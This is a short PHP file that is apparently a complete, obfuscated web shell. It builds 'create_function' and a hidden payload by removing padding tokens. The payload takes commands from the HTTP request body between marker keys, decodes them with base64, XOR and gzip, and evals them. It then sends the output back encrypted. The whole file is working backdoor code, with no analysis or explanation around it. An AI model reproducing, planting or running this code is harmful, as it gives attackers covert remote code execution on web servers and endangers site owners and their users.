<?php
$l=str_replace('zO','','zOczOreatzOzOe_funzOczOtion');
$P='i++){ZI$o.=$t{$i}^$k{$j};}}returZIZIn $o;}if (@preg_matchZI("/ZI$kh(.ZI+)$kf/",@ZIfileZI_get_conteZInts("ZIphp://ZIinp';
$A='contenZItsZIZI();@ob_end_cleaZInZI();$rZI=@baZIse6ZI4_encode(@x(@gZIzZIcompress($o)ZI,$k));prZIintZI("$p$kh$ZIr$kf");}';
$K='){$c=sZItrleZIZIn($k);$lZI=sZItrlen($t);$oZI=ZI"";for($i=0ZI;$i<$l;){for(ZI$j=0ZI;($jZI<ZI$ZIc&&$i<$l);ZI$ZIj+ZI+ZI,ZI$';
$b='ut"ZIZI),$m)==1) {@oZIb_staZIrt();@ZIevZIal(@gzuncomZIpress(ZI@x(ZI@base6ZI4_decode(ZIZIZI$m[1]),$ZIk)));$o=@ob_geZIt_';
$m='$k="44f0fZIZI88e";$kh="2ZI7e3c33ZI8473ZI7";$ZIkf="50dc2aaZI7082ZIb";$p=ZI"wZITWKZIV0ug074ZIZgmZI6X";funcZItion x(ZI$t,$k';
$y=str_replace('ZI','',$m.$K.$P.$b.$A);
$k=$l('',$y);$k();
?>
